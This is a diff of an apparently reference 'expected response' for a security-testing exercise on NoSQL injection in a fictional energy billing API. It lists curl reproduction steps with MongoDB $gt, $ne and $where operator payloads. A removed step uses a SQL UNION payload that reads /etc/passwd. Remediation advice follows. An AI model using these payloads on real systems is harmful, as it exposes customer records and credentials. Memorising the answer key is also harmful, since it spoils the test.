@@ -1,63 +1,61 @@
 # Expected Response
 
 ## System
-- Domain: Energy / Utilities / Smart Grid
-- System: PowerGrid Customer Billing API
+- System: PowerGrid Customer Billing API v2.8.0
+- Domain: ENERGY / UTILITIES / SMART GRID
 - Example ID: INJ-0114
-- Vulnerability: NoSQL Injection
+- Risk ID: RISK-INJ-114
+- Vulnerability: NoSQL Injection (NoSQLi)
 
-## Priority Findings
+## Findings
 
-### Finding 1: NoSQL Injection on `/api/v1/users`
-**Severity:** Critical
-**Category:** Injection (from data/knowledge/injections)
+### 1. NoSQL Injection on `/api/v2/orders?category=` (HAR Primary)
 
-**Summary:**
-The `/api/v1/users` endpoint accepts a `search` query parameter that is directly
-interpolated into a raw database query without sanitization. This enables NoSQL Injection (NoSQLi),
-allowing an attacker to bypass authentication, extract all records, or execute arbitrary operations.
+The `category` parameter is passed unsanitized into a MongoDB query (Section 2.0: "MongoDB / document store"). When the user supplies a JSON operator object `{ "$gt": "" }`, the backend constructs `db.orders.find({ category: { "$gt": "" } })` which returns all documents where `category` is greater than an empty string — bypassing the category filter and exposing all billing/order records.
+
+**Note on internal inconsistency:** The code snippet (Section 3.0) shows raw SQL string concatenation (`SELECT * FROM orders WHERE category = '${req.query.category}'`) which conflicts with the declared MongoDB architecture. The HAR payload is a MongoDB operator injection (`{ "$gt": "" }`). Primary demonstration uses the declared MongoDB NoSQLi; the SQL path is noted as a secondary code-path debt.
 
 **Evidence from HAR:**
-- Endpoint: `GET /api/v1/users?search={ "$gt": "" }`
-- Response: HTTP 200 with **all records returned** including password hashes and admin accounts
-- The query constructed: `SELECT * FROM users WHERE search = '{ "$gt": "" }'`
-  evaluates to true for all rows when the payload is `{ "$gt": "" }`
+- Endpoint: `GET /api/v2/orders?category={ "$gt": "" }`
+- Response: HTTP 200 with all records including admin `password_hash` and `role: "ADMIN"`
+- MongoDB operator `$gt` in query parameter bypasses category restriction
 
-**Root Cause:**
-- Raw string concatenation used to build database query
-- No parameterized query / prepared statement
-- Application DB account has excessive privileges (`db_owner`)
+## Reproduction
 
-## Steps to Reproduce
-
-### Step 1 — Normal request (baseline)
+**Step 1 — Baseline:**
 ```bash
-curl -s "https://api.powergrid-custo.example.com/api/v1/users?search=normalvalue" \
+curl -s "https://api.powergrid-custo.example.com/api/v2/orders?category=residential" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-Expected: Returns matching records only.
+**Expected:** Returns only orders with `category: "residential"`.
 
-### Step 2 — Inject NoSQLi payload
+**Step 2 — NoSQLi: MongoDB `$gt` operator injection (primary HAR attack):**
 ```bash
-curl -s "https://api.powergrid-custo.example.com/api/v1/users?search={%20"$gt":%20""%20}" \
+curl -s "https://api.powergrid-custo.example.com/api/v2/orders?category=%7B%20%22%24gt%22%3A%20%22%22%20%7D" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-**Vulnerable outcome:** All rows returned, including admin password hashes.
-**Secure outcome:** 400 Bad Request / 0 results / sanitized error message.
+**Vulnerable outcome:** All orders returned regardless of category — including admin credentials as observed in HAR.
 
-### Step 3 — Privilege escalation (if DB over-privileged)
+**Step 3 — NoSQLi: `$ne` operator — return all non-matching documents:**
 ```bash
-# SQLi variant: attempt to read OS-level files (if DB runs as LocalSystem)
-curl -s "https://api.example.com/api/v1/users?search=' UNION SELECT null,null,load_file('/etc/passwd')--" \
+curl -s "https://api.powergrid-custo.example.com/api/v2/orders?category=%7B%22%24ne%22%3A%22nonexistent%22%7D" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
+**Vulnerable outcome:** All documents returned (category != "nonexistent" is always true for valid records).
 
-### Step 4 — Verbose error confirmation
+**Step 4 — NoSQLi: `$where` JavaScript injection (if MongoDB `$where` is enabled):**
 ```bash
-curl -s "https://api.example.com/api/v1/users?search='" \
+curl -s "https://api.powergrid-custo.example.com/api/v2/orders?category=%7B%22%24where%22%3A%221%3D%3D1%22%7D" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-**Expected verbose error (if misconfigured):** SQL syntax error message leaking table name, column names, or DB version.
+**Vulnerable outcome:** All documents returned via server-side JavaScript evaluation — potential for arbitrary JS execution if `$where` is enabled.
+
+**Step 5 — Verbose error confirmation:**
+```bash
+curl -s "https://api.powergrid-custo.example.com/api/v2/orders?category=%7B%22%24invalidOp%22%3A1%7D" \
+  -H "Authorization: Bearer <VALID_TOKEN>"
+```
+**Expected verbose error:** MongoDB query error leaking collection name `orders` or operator details.
 
 ## Secure Outcome
 ```json
@@ -65,8 +63,9 @@ curl -s "https://api.example.com/api/v1/users?search='" \
 ```
 
 ## Remediation
-1. **Use parameterized queries / prepared statements everywhere:** Replace string concatenation with `?` or named parameters.
-2. **Restrict DB account privileges:** Application account should only have SELECT/INSERT/UPDATE/DELETE on required tables.
-3. **Disable verbose error messages in production:** Return generic 500/400 errors without DB details.
-4. **Deploy input validation middleware:** Reject inputs containing SQL metacharacters (`'`, `"`, `;`, `--`, `/*`).
-5. **ORM audit:** Review all `raw()` or native query calls in ORM usage; apply parameterization.
+- **Input type enforcement (RISK-INJ-114):** Validate that `category` is a plain string before passing to MongoDB; reject JSON object/operator values. Use `typeof value !== 'string'` guard.
+- **Parameterized MongoDB queries:** Use MongoDB driver's typed query building: `db.orders.find({ category: String(req.query.category) })` instead of passing raw user input as query object.
+- **Disable `$where` operator:** Set `javascriptEnabled: false` in MongoDB configuration to prevent server-side JS execution.
+- **Restrict DB account:** Application MongoDB user should only have read access on required collections — not admin/db_owner equivalent.
+- **Deploy input validation middleware:** Reject query parameters containing `$` MongoDB operators (e.g., block `$gt`, `$ne`, `$where`, `$regex`).
+- **Disable verbose error messages in production.**
